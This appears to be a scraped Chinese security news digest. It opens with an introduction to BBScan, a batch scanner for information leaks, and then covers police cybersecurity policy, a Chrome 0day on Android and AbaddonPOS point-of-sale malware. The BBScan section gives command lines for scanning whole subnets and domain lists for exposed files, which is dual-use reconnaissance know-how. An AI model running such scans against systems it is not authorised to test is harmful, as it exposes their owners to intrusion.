 
对于一个拥有上万IP的企业，又如何快速定位可能存在弱点的机器呢？ 
 
试试信息泄漏批量扫描脚本 BBScan。
 
BBScan是一个迷你的信息泄漏批量扫描脚本。规则字典非常小，但尽量保证准确和可利用性。 
 
特性： 
 
小字典
可以自动扫描 Target/Mask 网络中所有的主机 
误报率小
安装: 
 
在pip已经安装的前提下，可以直接： 
 
pip install -r requirements.txt
使用示例： 
1. 扫描单个web服务 www.target.com 
 
python BBScan.py--host www.target.com --browser
2. 扫描www.target.com和www.target.com/28下的其他主机 
 
python BBScan.py--host www.target.com --network 28 --browser
3. 扫描txt文件中的所有主机 
 
python BBScan.py -f wandoujia.com.txt--browser
4. 从文件夹中导入所有的主机并扫描 
 
python BBScan.py -d targets/--browser
5. 如果是为了去各大src刷漏洞，可以考虑把所有域名保存到targets文件夹下，然后
 
python BBScan.py -d targets/ --network 30 --browser
扫描器不仅仅支持域名，parser会自动解析url，以下url都是合法的：
 
www.target.com:8888
 
http://www.target.com/blog/index.php?id=123&ampcate=tech
 
 
https://www.target.com
 
111.111.111.111
111.111.111.111:2222
�network 参数用于设置子网掩码，小公司设为28~30，中等规模公司设置26~28，大公司设为24~26 
当然，避免设为24，扫描过于耗时，除非是想在各SRC多刷几个漏洞。 :)
该插件是从内部扫描器中抽离出来的，感谢 Jekkay Hu&lt34538980[at]qq.com&gt 
如果你有非常有用的规则，请找几个网站验证测试后，再 pull request 
脚本还会优化，接下来的事: 
增加有用规则，将规则更好地分类，细化 
后续可以直接从 rules\request 文件夹中导入HTTP_request 
优化扫描逻辑
 
考虑从文件导入http request开始扫描




-----------------------------------------------------------22-----------------------------------------------------------
0X22: 
     公安机关加强网络安全管理：将阿里百度纳入等级保护 


在昨日《金融电子化》杂志社和绿盟科技举办的“Security+ 2015金融信息安全峰会”上，国家网络与信息安全信息通报中心黄小苏处长介绍了当前公安机关组织开展网络安全工作的情况。主要有十点：


　　第一点是开展网络安全执法大检查。2015年5月18日公安部组织召开了全国电视、电话会议，专题部署国家级重要信息系统和重点网站安全执法检查工作，由47个国家级重要信息系统地行业主管部门、276个信息系统地运营使用单位、网络安全的工作负责同志等4万余人参加。
　　通过4个月的检查时间，全国公安机关对2.3万家开展了网络安全现场检查工作，检查了重点网站2.8万个，向被检查单位印发了网络安全整改通知书，安全隐患告知书、执法检查反馈意见书共2.4万份。通过这个检查消除了重要信息系统和政府网站的安全隐患共6.5万处。
　　第二点是深入推进信息安全等级保护工作。多部委联合出台了一系列地政策文件和技术标准，组织开展等级测评机构能力验证，目前已经向社会推荐了140余家的测评机构，培养了4000名的测评师。第三点加强国际级重要信息系统地安全保障。第四点全面推进网络安全信息通报机制建设，提高检测和预警处置能力。第五点加强对全国政府网站的安全监管。第六点对地方党委政府开展考核。第七点组织开展智慧城市网络安全建设和管理工作。第八点组织开展网站安全专项政治行动。
　　第九点开展打击网络违法犯罪活动。活动前夕中心专门组织力量，对全国网络安全的一些工作情况进行部署，动员全国的各级网安干警，共破获从事网络攻击串改入侵系统、制作传木马等违法犯罪案件301起，抓获违法犯罪嫌疑人700多名，针对网络犯罪的专项行动，破获了约14万起案件。第十点推进法律政策标准地出台。
　　黄晓苏指出，当前中国网络安全问题依然突出，但是现在传统的办案方式却很困难，从立案到线索的溯源，包括数据的固定，后面的一系列的司法程序，跟目前的网络安全形势有差距。下一步的思路，是以等级保护为抓手，以信息通报为平台，以情报侦查为突破，以侦查打击为支撑，构建一个打防管控一体化的网络安全综合防控体系。
　　其中要将网络基础设施、重要信息系统、网站、大数据中心、云计算平台、物联网系统、工业控制系统、公众服务平台等，全部纳入等级保护监管对象，这个也是一个重大的变化。原来针对的是重要的信息系统，将来等级保护对象会扩大。目前中心已经将阿里、百度、新浪等互联网企业纳入到等级保护范畴，并建立了密切的合作关系。




-----------------------------------------------------------23-----------------------------------------------------------
0X23: 
     Chrome浏览器0day使得数百万安卓设备遭受远程威胁 

来自中国奇虎360的安全研究员GuangGong在最新版本的安卓平台Chrome浏览器中发现一个严重的0day漏洞，它允许攻击者获得受害者手机的全部管理员访问权限，并且该漏洞的利用代码能够工作于所有版本的安卓系统上，即使你的设备运行着最新版本的安卓操作系统。
　　攻击流程
　　黑客目前可以使用一种新的方式来攻击你的安卓智能手机，并能够远程获得安卓手机的完全控制权，即使你的设备运行着最新版本的安卓操作系统。这个利用代码用到了JavaScriptV8引擎中的一个漏洞，该引擎预装在几乎所有(百万级)现代的和更新版本的安卓手机中。
　　攻击者需要做的仅仅是诱使潜在受害者访问一个网站，该网站中包含有针对Chrome浏览器的恶意利用代码。一旦受害者访问了这个网站，在无需与用户进行任何交互的情况下，恶意程序就会利用Chrome中的漏洞安装任何恶意应用，使得黑客能够远程获取受害者手机的完整控制权。
　　漏洞影响
　　在今年东京举办的2015PacSec大会中的MobilePwn2Own攻击竞赛中，Gong当场演示了如何利用这个安卓平台Chrome浏览器中存在的漏洞。虽然这个0day漏洞不是驻留在安卓操作系统中，但是它能够影响运行流行操作系统的移动设备。PacSec组织者DragosRuiu补充道，这个利用方法在其他移动设备上也能够正常工作，因为它利用的漏洞存在于Chrome浏览器的JavaScript引擎中，这意味着它可能会影响所有安装了谷歌最新Chrome浏览器的的安卓系统。
　　Ruiu在一篇Google+上的博文中说道：
　　“在离线状态下，我们也在其他手机上测试了他的利用代码，看起来它也能够在很多其他设备上正常工作，所以我推测这是他投入开发的三个月所带来的成果。”
　　然而，关于这个利用方法的完整技术细节目前还未公布，但是这位研究人员已经向谷歌报告了该漏洞，谷歌预计将向他支付一笔相当大的漏洞利用赏金。
　　为了安全考虑，在谷歌发布针对此漏洞的安全补丁之前，建议安卓用户暂时使用其他浏览器。





-----------------------------------------------------------24-----------------------------------------------------------
0X24: 
     [11.19]通过Word文档进行感染的新型PoS机恶意程序出现 

=700) window.open('http://image.3001.net/images/20151115/14475647893211.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
目前，网络骗子大都使用尽可能多的渠道传播恶意程序。其中一个例子就是捆绑在Vawtrack银行木马当中的AbaddonPOS恶意程序，它通常对零售POS机发动攻击，并且通过一个复杂的恶意软件传递方式进行加载和传播。
这款新的恶意软件被称为“AbaddonPOS ”，“AbaddonPOS ”除了包含Vawtrack银行木马，还包含钓鱼攻击工具包、Bedep广告欺诈恶意软件、Pony infostealer和TinyLoader等恶意程序。
新型恶意程序感染过程
感染通常是通过微软Word文档进行，Word文档已经成为网络犯罪最喜欢使用的载体。第一种方法发送含有 Pony infostealer恶意软件的word文档。另外一种传播途径是用户访问恶意网站，其中一个版本的钓鱼攻击工具包让他们感染了Bedep恶意软件，建立连接到C&ampC服务器，然后下载TinyLoader，这种特殊的恶意软件只做一件事，从C&ampC服务器使用其自己的自定义协议，下载其它恶意软件，而这些恶意软件病毒通常仅仅只有5kb，例如“AbaddonPOS ”。
研究人员同时发现通过TinyLoader下载的“AbaddonPOS ”恶意软件病毒来源于一个新的类型，并表示之前从来没有见过。
=700) window.open('http://image.3001.net/images/20151115/14475646989530.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
恶意程序来源同一个作者
经过仔细观察，研究人员发现AbaddonPOS专门窃取信用卡和借记卡交易数据，也尝试通过各种反分析技巧来逃避检测，其中包反分析技术和模糊处理技术。研究人员对比TinyLoader和AbaddonPOS两款恶意软件病毒的程序代码时候发现两者还是有不少相同之处。
安全研究人员Proofpoint 表示：
“通过分析两种恶意软件程序的代码时，可以肯定这两个恶意软件家族的作者是同一个人。”
虽然使用这种技术来实现感染POS的方法不太常见，但是在美国假日购物季，使网络罪犯有足够的理由最大化他们的活动来获得回报。这种功能强大的POS恶意软件，可以捕捉到假日购物者信用卡和借记卡信息。
 





